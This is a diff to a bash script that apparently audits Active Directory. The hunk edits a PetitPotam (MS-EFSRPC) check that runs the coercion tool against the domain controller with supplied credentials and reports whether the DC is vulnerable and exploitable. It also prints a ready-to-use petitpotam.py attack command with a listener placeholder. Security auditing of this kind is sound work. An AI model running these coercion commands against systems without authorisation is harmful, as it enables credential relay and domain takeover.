@@ -263,30 +263,19 @@ else
 fi
 
 # PetitPotam (MS-EFSRPC) Check on DC
-PETITPOTAM_CMD=""
-if [ -x "/opt/tools/PetitPotam/PetitPotam.py" ]; then
-  PETITPOTAM_CMD="/opt/tools/PetitPotam/venv/bin/python3 /opt/tools/PetitPotam/PetitPotam.py"
-elif command -v petitpotam.py &>/dev/null; then
-  PETITPOTAM_CMD="petitpotam.py"
-fi
-
-if [ ! -z "$PETITPOTAM_CMD" ]; then
-  PETITPOTAM_OUTPUT=$($PETITPOTAM_CMD -d "$DOMAIN" -u "$USERNAME" -p "$PASSWORD" 127.0.0.1 $DC_IP 2>&1)
-  if echo "$PETITPOTAM_OUTPUT" | grep -q "Attack worked"; then
-    echo -e "${RED}[KO] PetitPotam (MS-EFSRPC) vulnerable on DC${NC}"
-    if [ ! -z "$NON_DC_UNCON" ]; then
-      echo -e "${RED}       └─ Exploitable: Non-DC system(s) with Unconstrained Delegation exist${NC}"
-    else
-      echo -e "${GREEN}       └─ Not Exploitable: No non-DC Unconstrained Delegation targets${NC}"
-    fi
-    echo -e "${GREY}       petitpotam.py -d '$DOMAIN' -u '$USERNAME' -p '$PASSWORD' <LISTENER_IP> $DC_IP${NC}"
-  elif echo "$PETITPOTAM_OUTPUT" | grep -q "probably PATCHED" && ! echo "$PETITPOTAM_OUTPUT" | grep -q "Attack worked"; then
-    echo -e "${GREEN}[OK] PetitPotam (MS-EFSRPC) patched on DC${NC}"
+PETITPOTAM_OUTPUT=$(/opt/tools/PetitPotam/venv/bin/python3 /opt/tools/PetitPotam/PetitPotam.py -d "$DOMAIN" -u "$USERNAME" -p "$PASSWORD" 127.0.0.1 $DC_IP 2>&1)
+if echo "$PETITPOTAM_OUTPUT" | grep -q "Attack worked"; then
+  echo -e "${RED}[KO] PetitPotam (MS-EFSRPC) vulnerable on DC${NC}"
+  if [ ! -z "$NON_DC_UNCON" ]; then
+    echo -e "${RED}       └─ Exploitable: Non-DC system(s) with Unconstrained Delegation exist${NC}"
   else
-    echo -e "${GREY}[--] PetitPotam check failed${NC}"
+    echo -e "${GREEN}       └─ Not Exploitable: No non-DC Unconstrained Delegation targets${NC}"
   fi
+  echo -e "${GREY}       petitpotam.py -d '$DOMAIN' -u '$USERNAME' -p '$PASSWORD' <LISTENER_IP> $DC_IP${NC}"
+elif echo "$PETITPOTAM_OUTPUT" | grep -q "probably PATCHED" && ! echo "$PETITPOTAM_OUTPUT" | grep -q "Attack worked"; then
+  echo -e "${GREEN}[OK] PetitPotam (MS-EFSRPC) patched on DC${NC}"
 else
-  echo -e "${GREY}[--] petitpotam.py not found${NC}"
+  echo -e "${GREY}[--] PetitPotam check failed${NC}"
 fi
 
 # WPAD
